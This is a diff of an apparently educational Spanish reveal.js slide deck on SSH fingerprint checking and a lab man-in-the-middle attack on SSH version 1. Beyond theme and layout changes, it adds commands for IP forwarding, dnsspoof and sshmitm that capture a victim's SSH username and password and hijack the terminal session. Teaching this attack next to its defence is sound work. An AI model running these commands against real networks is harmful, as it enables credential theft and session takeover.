@@ -1,5 +1,5 @@
 <!doctype html>
-<html lang="en">
+<html lang="es">
 
 	<head>
 		<meta charset="utf-8">
@@ -14,7 +14,7 @@
 		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
 
 		<link rel="stylesheet" href="css/reveal.css">
-		<link rel="stylesheet" href="css/theme/black.css" id="theme">
+		<link rel="stylesheet" href="css/theme/night.css" id="theme">
 
 		<!-- Code syntax highlighting -->
 		<link rel="stylesheet" href="lib/css/zenburn.css">
@@ -95,10 +95,12 @@
 				</section>
 				<section>
 					<h2>¿Cómo evitarlo?</h2>
-					<p>Podemos evitar conectarnos al servidor que no debemos comprobando su fingerprint.</p>
+					<p>Podemos evitar conectarnos al servidor que no debemos comprobando su fingerprint.
 					<img src="../fingerprint.png"/>
-					<p>Podemos comprobarlo de forma más visual activando el parámetro VisualHostKey en nuestro cliente</p>
+					</p>
+					<p>Podemos comprobarlo de forma más visual activando el parámetro VisualHostKey en nuestro cliente
 					<img src="../visualhostkey.png"/>
+					</p>
 				</section>
 				<section>
 					<h2>¿Y cuál es el fingerprint de mi servidor SSH?</h2>
@@ -116,8 +118,8 @@
 </code></pre>
 					</p>
 				</section>
-				<section>
-					<h2>Realizando un ataque Man-In-The-Middle</h2>
+				<section data-transition="slide" data-background="#4d7e65" data-background-transition="zoom">
+					<h2>Realizando un ataque </h2><h2> Man-In-The-Middle</h2>
 					<p>
 						En esta prueba tendremos tres máquinas: una máquina atacante, una máquina cliente y una máquina servidor. Además, usaremos un servidor SSH compatible con la versión 1 del protocolo. 
 					</p>
@@ -130,13 +132,13 @@
 						</ul>
 					</p>
 				</section>
-				<section>
+				<section data-background="#4d7e65" data-background-transition="zoom">
 					<p>
 						La idea es convertir nuestra máquina atacante en un router por donde pasará todo el tráfico de la máquina cliente y la máquina servidor.
 					</p>
 					<img src="../conec2.png"/>
 				</section>
-				<section>
+				<section data-background="#4d7e65" data-background-transition="zoom">
 					<table>
 						<thead>
 							<tr>
@@ -164,9 +166,9 @@
 						</tbody>
 					</table>
 				</section>
-				<section>
+				<section data-background="#4d7e65" data-background-transition="zoom">
 					<h2>Preparando la máquina atacante</h2>
-					En la máquina atacante introducimos los siguientes comandos:
+					<p>En la máquina atacante introducimos los siguientes comandos:</p>
 <pre><code data-trim>
 # echo 1 > /proc/sys/net/ipv4/ip_forward
 </code></pre>
@@ -176,6 +178,27 @@
 <pre><code data-trim>
 # dnsspoof -i eth1 -f dns.txt src 10.0.2.6
 </code></pre>
+<pre><code data-trim>
+# sshmitm -p 22 10.0.2.16
+</code></pre>
+
+				<p>Y ya sólo queda esperar a que la víctima haga una sesión SSH...</p>
+				</section>
+				<section data-background="#4d7e65" data-background-transition="zoom">
+					<p>Cuando la víctima se conecte verá el mensaje típico que se ve en la primera conexión:
+					<img src="../ataque5.png" /></p>
+					<p>Y nosotros veremos su contraseña y su usuario:
+					<img src="../ataque6.png" />
+					</p>
+				</section>
+				<section data-background="#4d7e65" data-background-transition="zoom">
+					<h2>Sesiones interactivas</h2>
+					<p>Pero no sólo podemos obtener el usuario y la contraseña, si usamos la opción -I de sshmitm, podremos además controlar la terminal del servidor desde la nuestra.
+					<img src="../ataque7.png" />
+					</p>
+				</section>
+				<section>
+					<h1>FIN</h1>
 				</section>
 			</div>
 		</div>
@@ -193,7 +216,7 @@
 				history: true,
 				center: true,
 
-				transition: 'slide', // none/fade/slide/convex/concave/zoom
+				transition: 'convex', // none/fade/slide/convex/concave/zoom
 
 				// Optional reveal.js plugins
 				dependencies: [
